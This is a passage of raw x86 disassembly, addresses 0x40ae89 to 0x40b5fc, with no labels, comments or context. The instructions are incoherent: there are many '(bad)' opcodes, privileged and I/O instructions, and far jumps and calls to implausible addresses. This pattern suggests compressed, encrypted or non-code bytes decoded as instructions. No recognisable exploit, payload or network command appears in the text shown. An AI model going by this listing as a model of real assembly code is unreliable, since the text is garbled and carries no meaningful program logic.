  40ae89:	add    bl,BYTE PTR cs:[edx-0x4f6a65d2]
  40ae90:	fnstenv [esi]
  40ae92:	ss daa 
  40ae94:	mov    edi,0x58594800
  40ae99:	xlat   BYTE PTR ds:[ebx]
  40ae9a:	and    al,BYTE PTR [edx+ebx*2]
  40ae9d:	ror    BYTE PTR [edi],1
  40ae9f:	pushf  
  40aea0:	add    BYTE PTR [ebx+ebp*8],bl
  40aea3:	shl    esi,1
  40aea5:	iret   
  40aea6:	pop    esi
  40aea7:	pop    ds
  40aea8:	push   0xffffffda
  40aeaa:	rcr    BYTE PTR [edx-0xc],1
  40aead:	imul   ecx,DWORD PTR [ecx-0x33],0x2b
  40aeb1:	sub    eax,0xec07d558
  40aeb6:	cmp    BYTE PTR [esi+0x1],ch
  40aeb9:	xlat   BYTE PTR ds:[ebx]
  40aeba:	push   esp
  40aebb:	jo     0x40af1b
  40aebd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aebe:	hlt    
  40aebf:	add    DWORD PTR [ecx+0x4f],edi
  40aec2:	ds popa 
  40aec4:	retf   0xe26c
  40aec7:	jns    0x40ae94
  40aec9:	jge    0x40aed6
  40aecb:	adc    eax,esi
  40aecd:	cmp    ch,BYTE PTR [ecx+0x762c630e]
  40aed3:	(bad)  
  40aed4:	addr16 cs addr16 inc esi
  40aed8:	clc    
  40aed9:	xor    ecx,DWORD PTR [edi]
  40aedb:	dec    esi
  40aedc:	mov    es,edx
  40aede:	imul   ebx,DWORD PTR [edx-0x17],0xa
  40aee2:	pop    es
  40aee3:	(bad)  
  40aee4:	mov    esi,0x54bf4fbc
  40aee9:	add    BYTE PTR [eax],bl
  40aeeb:	cmp    eax,DWORD PTR [esi]
  40aeed:	or     al,0x5
  40aeef:	les    edx,FWORD PTR cs:[esi+edx*4-0x67]
  40aef4:	(bad)  
  40aef5:	cmc    
  40aef6:	push   ebx
  40aef7:	mov    WORD PTR [ebx+0x4cdbcf50],?
  40aefd:	mov    edx,0x6ab05218
  40af02:	js     0x40af0d
  40af04:	rdmsr  
  40af06:	jae    0x40af12
  40af08:	pop    edx
  40af09:	pop    ecx
  40af0a:	mov    eax,0x46652f9
  40af0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af10:	test   BYTE PTR [edx+0x32],ah
  40af13:	retf   
  40af14:	mov    ds:0x807708a8,al
  40af19:	adc    BYTE PTR [eax-0x2ef24399],cl
  40af1f:	outs   dx,BYTE PTR ds:[esi]
  40af20:	add    bl,al
  40af22:	xchg   edx,eax
  40af23:	int3   
  40af24:	nop
  40af25:	imul   esp,DWORD PTR [esi+0x36],0x9e9d5476
  40af2c:	adc    bh,dl
  40af2e:	cmp    eax,0x392963b0
  40af33:	push   ecx
  40af34:	dec    ecx
  40af35:	xchg   ah,ah
  40af37:	data16 sbb al,0x22
  40af3a:	lds    ebx,FWORD PTR [eax+edx*1]
  40af3d:	sub    BYTE PTR [eax+edx*8-0x6f],0x21
  40af42:	mov    cl,0xe6
  40af44:	pusha  
  40af45:	ja     0x40af0d
  40af47:	lods   eax,DWORD PTR ds:[esi]
  40af48:	or     al,0x1a
  40af4a:	aaa    
  40af4b:	mul    DWORD PTR [ebp+0x63]
  40af4e:	inc    esp
  40af4f:	mov    ebx,DWORD PTR [eax]
  40af51:	dec    esp
  40af52:	sbb    DWORD PTR [ecx],0x9da9ce18
  40af58:	mov    ds:0x7f98a9c3,eax
  40af5d:	add    al,0xd2
  40af5f:	repnz popf 
  40af61:	pop    ds
  40af62:	pop    es
  40af63:	mul    DWORD PTR [esi-0xea2cd48]
  40af69:	loope  0x40aef6
  40af6b:	(bad)  
  40af6c:	and    eax,0x457caa86
  40af71:	mov    dl,BYTE PTR [esi-0x24ab4480]
  40af77:	sub    BYTE PTR ds:[ebx],0xc5
  40af7b:	sub    ah,BYTE PTR [ecx+0x36]
  40af7e:	das    
  40af7f:	xor    BYTE PTR [ecx],0x65
  40af82:	cld    
  40af83:	mov    al,0x6f
  40af85:	pop    edi
  40af86:	mov    eax,0x15b06e20
  40af8b:	jmp    0x8e3d3b0d
  40af90:	xchg   esi,eax
  40af91:	cmc    
  40af92:	rcl    BYTE PTR [ecx],0x17
  40af95:	cli    
  40af96:	jl     0x40af8b
  40af98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af99:	test   al,0x7c
  40af9b:	hlt    
  40af9c:	mov    bh,0xd9
  40af9e:	jo     0x40afbe
  40afa0:	add    esp,edx
  40afa2:	ret    0xd9b2
  40afa5:	xchg   edi,eax
  40afa6:	(bad)  
  40afa8:	stc    
  40afa9:	fldcw  WORD PTR [esi-0x3a]
  40afac:	int3   
  40afad:	mov    bl,0xe3
  40afaf:	cmp    al,0xe9
  40afb1:	scas   eax,DWORD PTR es:[edi]
  40afb2:	or     cl,0xe6
  40afb5:	loope  0x40b01f
  40afb7:	stc    
  40afb8:	test   esp,eax
  40afba:	addr16 loop 0x40afb9
  40afbd:	sub    ecx,DWORD PTR [ebx+0x11]
  40afc0:	in     eax,0x5
  40afc2:	jle    0x40aff9
  40afc4:	fiadd  WORD PTR [esi+eax*2+0x26]
  40afc8:	dec    esi
  40afc9:	lahf   
  40afca:	xchg   ebx,eax
  40afcb:	cmp    al,0xc4
  40afcd:	in     eax,dx
  40afce:	not    DWORD PTR [edi]
  40afd0:	mov    edi,0x75351d9d
  40afd5:	dec    ecx
  40afd6:	stc    
  40afd7:	inc    ebx
  40afd8:	sub    al,0xa7
  40afda:	pop    eax
  40afdb:	adc    BYTE PTR [ebx],0x4
  40afde:	mov    bh,0xaa
  40afe0:	fs mov ch,0x6f
  40afe3:	test   eax,0xab0c7198
  40afe8:	jnp    0x40b045
  40afea:	icebp  
  40afeb:	sub    esp,DWORD PTR [ebp+0x57]
  40afee:	popa   
  40afef:	cmp    dh,BYTE PTR [eax-0x7e]
  40aff2:	fs cld 
  40aff4:	idiv   BYTE PTR [ebx+0x2a]
  40aff7:	jle    0x40b054
  40aff9:	inc    esi
  40affa:	not    DWORD PTR [ecx+0xa21dea0]
  40b000:	or     eax,esi
  40b002:	stos   BYTE PTR es:[edi],al
  40b003:	inc    ebp
  40b004:	mov    ah,0xef
  40b006:	(bad)  
  40b007:	inc    edx
  40b008:	stos   DWORD PTR es:[edi],eax
  40b009:	add    DWORD PTR [ecx+ebp*2-0x79c91b62],esi
  40b010:	pusha  
  40b011:	cmp    al,bh
  40b013:	mov    esi,0x2c9a9b93
  40b018:	adc    DWORD PTR [ecx],0x2083b37a
  40b01e:	xor    bh,bl
  40b020:	xor    BYTE PTR [ebp+edi*1-0x175dd04c],ch
  40b027:	in     eax,0xb6
  40b029:	fsub   st(7),st
  40b02b:	jge    0x40b01d
  40b02d:	add    eax,0xb29aa790
  40b032:	loope  0x40b05c
  40b034:	fwait
  40b035:	jae    0x40afe8
  40b037:	cmp    BYTE PTR [ecx-0x1a139f78],0xe0
  40b03e:	jo     0x40b059
  40b040:	outs   dx,BYTE PTR ds:[esi]
  40b041:	adc    eax,0x3be7ab2b
  40b046:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b047:	std    
  40b048:	test   DWORD PTR [esi+0x58],edi
  40b04b:	test   ch,dh
  40b04d:	adc    DWORD PTR [esi+0x5d],eax
  40b050:	jnp    0x40b08f
  40b052:	leave  
  40b053:	cld    
  40b054:	add    ebp,DWORD PTR ds:0xe2c3171b
  40b05a:	pop    edx
  40b05b:	jno    0x40b045
  40b05d:	xchg   esi,eax
  40b05e:	(bad)
  40b061:	dec    ebp
  40b062:	retf   0x105e
  40b065:	add    BYTE PTR [ebp-0xbd1e1b8],bh
  40b06b:	(bad)  [eax-0x40]
  40b06e:	fs dec ebp
  40b070:	sub    DWORD PTR [ebx+0x168b1ebe],ebx
  40b076:	or     DWORD PTR [ecx],0xffffffd1
  40b079:	sbb    eax,0x3d09ea2d
  40b07e:	ins    DWORD PTR es:[edi],dx
  40b07f:	or     dl,dh
  40b081:	jns    0x40b0d4
  40b083:	or     cl,bl
  40b085:	and    eax,0xea2fc358
  40b08a:	adc    eax,0xf614184c
  40b08f:	sbb    al,0xe3
  40b091:	cmc    
  40b092:	dec    edx
  40b093:	push   0xf11889e8
  40b098:	leave  
  40b099:	jp     0x40b09d
  40b09b:	adc    bl,BYTE PTR [edi+0x44308bca]
  40b0a1:	mov    dh,0xc7
  40b0a3:	lea    edi,[edi+0x40]
  40b0a6:	jle    0x40b073
  40b0a8:	dec    eax
  40b0a9:	push   ss
  40b0aa:	cli    
  40b0ab:	popa   
  40b0ac:	mov    dh,0x91
  40b0ae:	mov    ebp,0xe7e2f9ab
  40b0b3:	call   0x39b350d8
  40b0b8:	add    esi,DWORD PTR [edx]
  40b0ba:	dec    edi
  40b0bb:	repnz or BYTE PTR [ecx+0x47b658ac],dh
  40b0c2:	or     al,0xf2
  40b0c4:	pop    ecx
  40b0c5:	sbb    ah,bh
  40b0c7:	inc    ebx
  40b0c8:	cmp    al,0x66
  40b0ca:	mov    bl,0xaf
  40b0cc:	push   ds
  40b0cd:	mov    al,ds:0x5aad5f06
  40b0d2:	int3   
  40b0d3:	sar    BYTE PTR [esi],1
  40b0d5:	mov    bh,0x7e
  40b0d7:	jmp    0x15169478
  40b0dc:	test   esi,ebx
  40b0de:	test   al,0xce
  40b0e0:	dec    edi
  40b0e1:	sub    al,0x37
  40b0e3:	mov    cl,BYTE PTR [edx-0x4e]
  40b0e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0e7:	into   
  40b0e8:	pop    esi
  40b0e9:	ss das 
  40b0eb:	mov    ah,dl
  40b0ed:	out    0x5e,eax
  40b0ef:	pop    eax
  40b0f0:	mov    edi,0xbaafbdbc
  40b0f5:	mov    dl,0xcc
  40b0f7:	xor    ch,BYTE PTR [ebp-0x2a]
  40b0fa:	mov    esp,0x8e73b4f9
  40b0ff:	int    0x8d
  40b101:	leave  
  40b102:	fdivr  st(2),st
  40b104:	adc    DWORD PTR [ebx-0x74],ecx
  40b107:	jl     0x40b164
  40b109:	cmp    BYTE PTR [edi+0x3f],bl
  40b10c:	nop
  40b10d:	dec    edx
  40b10e:	hlt    
  40b10f:	inc    edx
  40b110:	mov    esp,0xcfdaa880
  40b115:	sub    al,0xb4
  40b117:	sub    DWORD PTR [edi],edi
  40b119:	sbb    ah,BYTE PTR [ecx+edi*1]
  40b11c:	(bad)  
  40b11d:	jno    0x40b0e2
  40b11f:	adc    DWORD PTR [ecx+0x7f],ecx
  40b122:	sbb    DWORD PTR [ecx],eax
  40b124:	or     bl,BYTE PTR [ebx-0x48f5e4c5]
  40b12a:	pop    es
  40b12b:	cmp    ch,BYTE PTR [ebx-0xeb5f90]
  40b131:	mov    esi,0xaa97a9ae
  40b136:	add    dl,BYTE PTR ds:0x11da0480
  40b13c:	xchg   ecx,eax
  40b13d:	jmp    0x40b160
  40b13f:	gs cwde 
  40b141:	add    ecx,DWORD PTR [esi]
  40b143:	mov    eax,ds:0x73bc1917
  40b148:	mov    ebx,edx
  40b14a:	xchg   DWORD PTR [edx],esi
  40b14c:	(bad)  
  40b14d:	mov    esi,0xcc897f0f
  40b152:	loop   0x40b0ee
  40b154:	pop    esi
  40b155:	sbb    BYTE PTR [eax-0x75464eff],dh
  40b15b:	mov    ?,WORD PTR [eax]
  40b15d:	push   ds
  40b15e:	inc    eax
  40b15f:	stos   DWORD PTR es:[edi],eax
  40b160:	mov    esi,0xb645b7da
  40b165:	inc    ecx
  40b166:	retf   0x564
  40b169:	sbb    bh,BYTE PTR [ebx]
  40b16b:	sar    BYTE PTR [edx+0x22],cl
  40b16e:	gs dec ebp
  40b170:	dec    edi
  40b171:	rcl    al,1
  40b173:	int    0x93
  40b175:	icebp  
  40b176:	(bad)  
  40b177:	(bad)  
  40b178:	in     eax,dx
  40b179:	sbb    cl,BYTE PTR [ecx-0x55a423bd]
  40b17f:	mov    dl,0x24
  40b181:	dec    ebx
  40b182:	in     al,dx
  40b183:	add    al,BYTE PTR [ebp+0x7e92dd5d]
  40b189:	scas   eax,DWORD PTR es:[edi]
  40b18a:	bound  esi,QWORD PTR [ebx-0x30]
  40b18d:	into   
  40b18e:	sar    edi,cl
  40b190:	and    eax,0xc666065a
  40b195:	sbb    eax,esi
  40b197:	sar    BYTE PTR [ebx+0x6],1
  40b19a:	sbb    DWORD PTR [esi],ebx
  40b19c:	mov    bp,0x138c
  40b1a0:	jns    0x40b216
  40b1a2:	fdivr  QWORD PTR [ebp+0x2312ee27]
  40b1a8:	adc    al,0x8f
  40b1aa:	sub    eax,0xf4f7fe55
  40b1af:	jmp    0x6aaa:0x38ccaee
  40b1b6:	add    al,0x32
  40b1b8:	fst    DWORD PTR [edx+0x26]
  40b1bb:	push   ebx
  40b1bc:	mov    al,0xc1
  40b1be:	int3   
  40b1bf:	hlt    
  40b1c0:	jl     0x40b15a
  40b1c2:	mov    al,al
  40b1c4:	add    DWORD PTR ds:0x1bb745dd,ebp
  40b1ca:	dec    eax
  40b1cb:	idiv   DWORD PTR [edx]
  40b1cd:	jb     0x40b16e
  40b1cf:	sub    ch,BYTE PTR [ecx]
  40b1d1:	(bad)  
  40b1d2:	jb     0x40b244
  40b1d4:	inc    esp
  40b1d5:	fisttp WORD PTR [edi+esi*2+0x7d]
  40b1d9:	mov    dl,0x31
  40b1db:	mov    al,ds:0xe4002b55
  40b1e0:	xchg   BYTE PTR [esi+0x4ad6045c],bh
  40b1e6:	mov    cl,BYTE PTR [esi-0x579d89e1]
  40b1ec:	mov    ecx,0x39844ba1
  40b1f1:	ja     0x19cb05d0
  40b1f7:	or     edi,DWORD PTR [esi+0x4209680b]
  40b1fd:	cwde   
  40b1fe:	imul   ebx,DWORD PTR [eax+0x1137f3a8],0xdb9d8a75
  40b208:	test   eax,0x3a8172af
  40b20d:	adc    BYTE PTR [edi+0x2d],cl
  40b210:	inc    edi
  40b211:	lods   eax,DWORD PTR ds:[esi]
  40b212:	or     eax,0xf7312d4
  40b217:	std    
  40b218:	(bad)  
  40b219:	out    0xa1,eax
  40b21b:	push   ecx
  40b21c:	cwde   
  40b21d:	inc    edi
  40b21e:	dec    edi
  40b21f:	or     dh,BYTE PTR [ecx]
  40b221:	mov    ebp,0x5f2028bb
  40b226:	push   esp
  40b227:	and    BYTE PTR [ecx+0x39d277f5],ch
  40b22d:	jb     0x40b29b
  40b22f:	mov    bl,0x9f
  40b231:	xor    esi,DWORD PTR [ecx]
  40b233:	dec    edx
  40b234:	das    
  40b235:	retf   
  40b236:	pop    ecx
  40b237:	out    0x35,al
  40b239:	adc    eax,0xb0540fba
  40b23e:	shl    DWORD PTR [ecx-0x33],1
  40b241:	mov    edx,0xcc3286a9
  40b246:	push   ss
  40b247:	rol    DWORD PTR [ecx-0x60],cl
  40b24a:	lods   al,BYTE PTR ds:[esi]
  40b24b:	(bad)  
  40b24c:	int    0x72
  40b24e:	pop    edx
  40b24f:	dec    eax
  40b250:	leave  
  40b251:	inc    bx
  40b253:	dec    esi
  40b254:	lock scas al,BYTE PTR es:[edi]
  40b256:	outs   dx,BYTE PTR ds:[esi]
  40b257:	push   0xd282c156
  40b25c:	cmp    BYTE PTR [esp+ecx*2-0x24459793],cl
  40b263:	and    eax,0xa52d275f
  40b268:	in     al,dx
  40b269:	lahf   
  40b26a:	xor    edx,eax
  40b26c:	inc    ebx
  40b26d:	in     al,0xf1
  40b26f:	cli    
  40b270:	mov    eax,0x5ed34cf7
  40b275:	outs   dx,BYTE PTR ds:[esi]
  40b276:	pop    ecx
  40b278:	shl    DWORD PTR [ebx+edx*4],1
  40b27b:	nop
  40b27c:	enter  0x698d,0x6f
  40b280:	cmp    BYTE PTR [esi-0xc],dh
  40b283:	outs   dx,BYTE PTR ds:[esi]
  40b284:	js     0x40b245
  40b286:	fs mov eax,0xd4734d29
  40b28c:	daa    
  40b28d:	dec    esp
  40b28e:	dec    ebp
  40b28f:	inc    esp
  40b290:	push   0x4ecc4006
  40b295:	(bad)  
  40b296:	push   ds
  40b297:	scas   eax,DWORD PTR es:[edi]
  40b298:	mov    bl,0x61
  40b29a:	into   
  40b29b:	fist   WORD PTR [edi+0x76]
  40b29e:	pop    ecx
  40b29f:	xlat   BYTE PTR ds:[ebx]
  40b2a0:	and    ebx,DWORD PTR [edx+eax*1-0x50]
  40b2a4:	cmp    DWORD PTR [esi],esp
  40b2a6:	out    dx,eax
  40b2a7:	jge    0x40b29b
  40b2a9:	sar    BYTE PTR [ecx+0x685c5b6e],0x4d
  40b2b0:	fmul   st,st(4)
  40b2b2:	sbb    BYTE PTR [ebp+0x639826f5],0x51
  40b2b9:	imul   esp,DWORD PTR [ebx],0xcb9baaef
  40b2bf:	xchg   esp,eax
  40b2c0:	js     0x40b2a9
  40b2c2:	and    ebp,DWORD PTR [edi]
  40b2c4:	jbe    0x40b29c
  40b2c6:	out    0xe0,al
  40b2c8:	(bad)  
  40b2c9:	shr    DWORD PTR [esi-0x59a13577],cl
  40b2cf:	cmc    
  40b2d0:	or     al,0x3e
  40b2d2:	mov    cl,0x15
  40b2d4:	lods   al,BYTE PTR ds:[esi]
  40b2d5:	lods   eax,DWORD PTR ds:[esi]
  40b2d6:	ds xchg ebp,eax
  40b2d8:	inc    esi
  40b2d9:	pusha  
  40b2da:	mov    bl,0xb3
  40b2dc:	out    dx,eax
  40b2dd:	push   ebx
  40b2de:	pop    es
  40b2df:	lahf   
  40b2e0:	adc    ebx,DWORD PTR [edi+0x1b]
  40b2e3:	mov    bh,0x4
  40b2e5:	repz and al,bh
  40b2e8:	inc    DWORD PTR [esi]
  40b2ea:	clc    
  40b2eb:	stos   DWORD PTR es:[edi],eax
  40b2ec:	out    dx,eax
  40b2ed:	sbb    eax,0xd8e7b91
  40b2f2:	call   0x4790569c
  40b2f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2f8:	and    BYTE PTR [esi-0x38],dl
  40b2fb:	mov    dl,0xa7
  40b2fd:	lock mov ?,WORD PTR [ebx+ecx*1-0x24]
  40b302:	aaa    
  40b303:	fcomp  QWORD PTR [edi+0x6a]
  40b306:	out    0x91,al
  40b308:	aam    0xf2
  40b30a:	cli    
  40b30b:	hlt    
  40b30c:	mov    BYTE PTR [ecx-0x7cb9efa9],bl
  40b312:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b313:	sbb    al,0x6b
  40b315:	dec    edx
  40b316:	xchg   edi,eax
  40b317:	mov    eax,ds:0x610c567d
  40b31c:	outs   dx,DWORD PTR ds:[esi]
  40b31d:	push   edx
  40b31e:	mov    ebx,ecx
  40b320:	mov    al,ds:0xd4556241
  40b325:	pop    ss
  40b326:	mov    bl,0xd1
  40b328:	mov    cl,0x1e
  40b32a:	push   es
  40b32b:	jle    0x40b30f
  40b32d:	frstor [ebp+0x93f2cda]
  40b333:	out    dx,eax
  40b334:	sub    eax,0xae3be74a
  40b339:	popf   
  40b33a:	cld    
  40b33b:	fwait
  40b33c:	loop   0x40b386
  40b33e:	mov    bh,0xe4
  40b340:	or     BYTE PTR [edi],ah
  40b342:	aad    0xa6
  40b344:	arpl   sp,cx
  40b346:	sti    
  40b347:	mov    BYTE PTR [ecx-0x51f5e545],cl
  40b34d:	test   BYTE PTR [ecx-0x43],dh
  40b350:	add    eax,0xf2df61db
  40b355:	inc    ecx
  40b356:	and    al,0xf2
  40b358:	sub    eax,0x7a17ff1b
  40b35d:	or     al,0x85
  40b35f:	jns    0x40b339
  40b361:	gs sbb al,0xe8
  40b364:	in     eax,dx
  40b365:	or     edi,esi
  40b367:	jne    0x40b3d3
  40b369:	fidiv  WORD PTR [ebx+edi*2+0x5d]
  40b36d:	mov    ebx,ebp
  40b36f:	jb     0x40b3e5
  40b371:	int    0xff
  40b373:	jb     0x40b316
  40b375:	xor    BYTE PTR ds:0x419e77c7,0xbb
  40b37c:	les    ecx,FWORD PTR [edi+0x29]
  40b37f:	out    dx,al
  40b380:	jb     0x40b3bf
  40b382:	inc    ecx
  40b383:	xchg   edi,eax
  40b384:	emms   
  40b386:	neg    DWORD PTR [edi-0x5c]
  40b389:	pop    ecx
  40b38a:	fisubr DWORD PTR [esi-0x42]
  40b38d:	pusha  
  40b38e:	fxtract 
  40b390:	inc    ecx
  40b391:	inc    ecx
  40b392:	shr    DWORD PTR [edi-0x30],cl
  40b395:	nop
  40b396:	(bad)
  40b399:	stos   DWORD PTR es:[edi],eax
  40b39a:	fbld   TBYTE PTR [edx-0x1e]
  40b39d:	sar    bl,0x55
  40b3a0:	or     edi,ebp
  40b3a2:	test   DWORD PTR [ecx-0x665cc142],edx
  40b3a8:	xchg   edx,eax
  40b3a9:	inc    ebx
  40b3aa:	test   BYTE PTR ds:0x9577b0be,bl
  40b3b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3b1:	call   0x5b39:0xaafe92d1
  40b3b8:	ret    0xa925
  40b3bb:	(bad)  
  40b3bc:	dec    esp
  40b3bd:	aas    
  40b3be:	mov    esi,0x490b4b78
  40b3c3:	add    ecx,DWORD PTR [esi+0x33]
  40b3c6:	popf   
  40b3c7:	push   0x19
  40b3c9:	jmp    0x521d2ae2
  40b3ce:	cmp    ah,al
  40b3d0:	add    DWORD PTR [ecx],0x34
  40b3d3:	sub    DWORD PTR [eax+ebp*1-0x69],0xffffffee
  40b3d8:	retf   0x9992
  40b3db:	mov    ebx,0xb6e718e8
  40b3e0:	sbb    bl,cl
  40b3e2:	xchg   DWORD PTR [eax+0x74292e0a],esi
  40b3e8:	test   al,ah
  40b3ea:	daa    
  40b3eb:	push   0xffffffa5
  40b3ed:	cmc    
  40b3ee:	jns    0x40b454
  40b3f0:	mov    ah,0xc
  40b3f2:	imul   edi,DWORD PTR [edx],0xb4998c53
  40b3f8:	mov    esi,DWORD PTR [edx-0x7]
  40b3fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3fc:	xchg   ebp,eax
  40b3fd:	fild   QWORD PTR ds:0x7e0d73a4
  40b403:	hlt    
  40b404:	das    
  40b405:	dec    ebx
  40b406:	rcl    BYTE PTR [edx-0x7d84c168],0x8b
  40b40d:	sbb    eax,0x2ff92976
  40b412:	aam    0x70
  40b414:	(bad)  
  40b415:	mov    ds:0xc51df5d9,al
  40b41a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b41b:	pop    esi
  40b41d:	jl     0x40b3ce
  40b41f:	enter  0x68f5,0x61
  40b423:	cmp    DWORD PTR ds:0x36a4e348,ebp
  40b429:	mov    ah,cl
  40b42b:	enter  0xced3,0x56
  40b42f:	retf   
  40b430:	test   BYTE PTR [edx+0x4f],bh
  40b433:	push   0xffffffc5
  40b435:	sub    DWORD PTR [eax-0x5f],edx
  40b438:	(bad)  
  40b439:	leave  
  40b43a:	mov    al,0xa0
  40b43c:	jle    0x40b43c
  40b43e:	mov    esp,0xa655cb08
  40b443:	ja     0x40b42c
  40b445:	out    0x9c,eax
  40b447:	pop    ds
  40b448:	enter  0x93cd,0x1e
  40b44c:	and    BYTE PTR [ebp-0x3b50199f],0x25
  40b453:	mov    esi,DWORD PTR [ebx-0x117f09fc]
  40b459:	int    0xa0
  40b45b:	mov    ebp,0x380a2476
  40b460:	inc    edi
  40b461:	mov    dh,dl
  40b463:	sbb    DWORD PTR [ecx+eax*1-0x45],0xffffffcd
  40b468:	or     al,0xe7
  40b46a:	loop   0x40b474
  40b46c:	push   ebp
  40b46d:	and    BYTE PTR [edi-0x55a72aa6],0xde
  40b474:	in     eax,0x8b
  40b476:	lea    esi,[eax+ebp*4]
  40b479:	out    0x15,eax
  40b47b:	ds add eax,0x5317ae82
  40b481:	sar    DWORD PTR [esi+0x1f917039],0x95
  40b488:	push   ds
  40b489:	xor    eax,0x14b0b2c0
  40b48e:	data16 js 0x40b427
  40b491:	xor    eax,0xdbf598b7
  40b496:	retf   
  40b497:	or     al,BYTE PTR [ecx]
  40b499:	dec    eax
  40b49a:	enter  0x36f4,0xda
  40b49e:	inc    esp
  40b49f:	xchg   esp,eax
  40b4a0:	ins    DWORD PTR es:[edi],dx
  40b4a1:	je     0x40b47e
  40b4a3:	xchg   ebp,eax
  40b4a4:	in     al,dx
  40b4a5:	inc    eax
  40b4a6:	push   es
  40b4a7:	xchg   edi,eax
  40b4a8:	(bad)  
  40b4a9:	and    ecx,DWORD PTR [edi+0x5b]
  40b4ac:	std    
  40b4ad:	pop    ds
  40b4ae:	mov    ecx,0x960acb8
  40b4b3:	adc    eax,0x7cf56fd6
  40b4b8:	push   gs
  40b4ba:	stc    
  40b4bb:	rcl    DWORD PTR ds:0x70c4e1dc,0x62
  40b4c2:	inc    esi
  40b4c3:	and    esp,DWORD PTR [esi]
  40b4c5:	sbb    bh,BYTE PTR [esi-0x526eb15d]
  40b4cb:	jecxz  0x40b4c7
  40b4cd:	imul   ebx,eax,0x27
  40b4d0:	inc    eax
  40b4d1:	xlat   BYTE PTR ds:[ebx]
  40b4d2:	jne    0x40b523
  40b4d4:	fild   DWORD PTR [ecx]
  40b4d6:	add    DWORD PTR [ebp-0x2f326b0b],ebx
  40b4dc:	(bad)  
  40b4dd:	pusha  
  40b4de:	sar    DWORD PTR [ebx],cl
  40b4e0:	cli    
  40b4e1:	adc    al,0x5c
  40b4e3:	and    al,0x29
  40b4e5:	push   0xb1864894
  40b4ea:	mov    dl,ah
  40b4ec:	sbb    ebp,eax
  40b4ee:	ins    BYTE PTR es:[edi],dx
  40b4ef:	cmp    BYTE PTR [edi-0x79],dh
  40b4f2:	adc    edx,ecx
  40b4f4:	pop    es
  40b4f5:	pop    ecx
  40b4f6:	(bad)  
  40b4f7:	mov    ebx,0x247d9cfd
  40b4fc:	out    0x3f,eax
  40b4fe:	repz sbb al,0x8
  40b501:	jne    0x40b4aa
  40b503:	push   esp
  40b504:	jge    0x40b578
  40b506:	jns    0x40b4bf
  40b508:	mov    esi,0xf9ff7be5
  40b50d:	nop
  40b50e:	(bad)  
  40b50f:	fist   WORD PTR [esi+0x37412c03]
  40b515:	in     al,0x96
  40b517:	sub    al,BYTE PTR [edi-0x53]
  40b51a:	daa    
  40b51b:	mov    al,ds:0xbcd570f9
  40b520:	hlt    
  40b521:	inc    eax
  40b522:	xchg   ecx,eax
  40b523:	and    al,dl
  40b525:	test   al,0x6f
  40b527:	imul   esp,DWORD PTR [edx+0x63f1093f],0xc0c37024
  40b531:	mov    bl,0x1b
  40b533:	mov    ebp,0xb1834fe9
  40b538:	cmc    
  40b539:	pop    esp
  40b53a:	mov    edi,0x1464aeba
  40b53f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b540:	test   BYTE PTR [ebx+0x1004e8be],dl
  40b546:	addr16 push esp
  40b548:	lods   eax,DWORD PTR ds:[esi]
  40b549:	repnz outs dx,DWORD PTR ds:[esi]
  40b54b:	adc    DWORD PTR [edi+0x1e997bc9],ecx
  40b551:	in     eax,0x9a
  40b553:	and    eax,0x73f89d95
  40b558:	fsubr  QWORD PTR [edx+eiz*2]
  40b55b:	mov    esp,DWORD PTR [esp+edx*4+0x5729379c]
  40b562:	lods   al,BYTE PTR ds:[esi]
  40b563:	xlat   BYTE PTR ds:[ebx]
  40b564:	dec    esp
  40b565:	(bad)  
  40b566:	rcl    esp,cl
  40b568:	sub    al,0xd
  40b56a:	shl    BYTE PTR ds:0xd78f72e2,1
  40b570:	adc    DWORD PTR [edi+0x32d63500],esi
  40b576:	mov    es,WORD PTR [edi-0x65]
  40b579:	xchg   ebp,eax
  40b57a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b57b:	xor    bh,ch
  40b57d:	cmp    BYTE PTR [ecx-0x301913a6],bh
  40b583:	mov    dl,0x18
  40b585:	xchg   edx,eax
  40b586:	jge    0x40b584
  40b588:	jmp    0x5fb85169
  40b58d:	xlat   BYTE PTR ds:[ebx]
  40b58e:	test   al,0x2e
  40b590:	aaa    
  40b591:	mov    ebp,0xbf046ecb
  40b596:	or     al,0x21
  40b598:	dec    eax
  40b599:	call   0xdb3ebc69
  40b59e:	push   es
  40b59f:	pushf  
  40b5a0:	mov    ah,0x6
  40b5a2:	add    al,0x32
  40b5a4:	rcl    DWORD PTR [edx+0x4d],1
  40b5a7:	js     0x40b5a4
  40b5a9:	xor    DWORD PTR [eax],ecx
  40b5ab:	push   edi
  40b5ac:	ja     0x40b5e7
  40b5ae:	std    
  40b5af:	frndint 
  40b5b1:	outs   dx,DWORD PTR ds:[esi]
  40b5b2:	sub    DWORD PTR [ebx+0x22],ecx
  40b5b5:	inc    edi
  40b5b6:	mov    al,0x4d
  40b5b8:	cmp    BYTE PTR [ecx],ch
  40b5ba:	sbb    ch,BYTE PTR [edi]
  40b5bc:	jge    0x40b55a
  40b5be:	add    cl,ch
  40b5c0:	xchg   ecx,eax
  40b5c1:	mov    ebp,0xc83cec7
  40b5c6:	cmp    al,0xad
  40b5c8:	popa   
  40b5c9:	int    0xec
  40b5cb:	fbld   TBYTE PTR [eax+ebx*8]
  40b5ce:	retf   
  40b5cf:	pushf  
  40b5d0:	and    DWORD PTR ds:0xd423446,edx
  40b5d6:	pop    edx
  40b5d7:	call   0x98a39190
  40b5dc:	sahf   
  40b5dd:	fmul   st(4),st
  40b5df:	pop    edx
  40b5e0:	adc    DWORD PTR [eax-0x518ff99d],ebx
  40b5e6:	adc    edi,DWORD PTR [eax+ebp*4+0x30]
  40b5ea:	jecxz  0x40b623
  40b5ec:	lds    edi,FWORD PTR [esp+eiz*4+0x6e6c23cc]
  40b5f3:	das    
  40b5f4:	jno    0x40b607
  40b5f6:	repz fst st(2)
  40b5f9:	and    ch,bl
  40b5fb:	pop    ebp
  40b5fc:	jmp    0xbc0b:0xf8c17a92
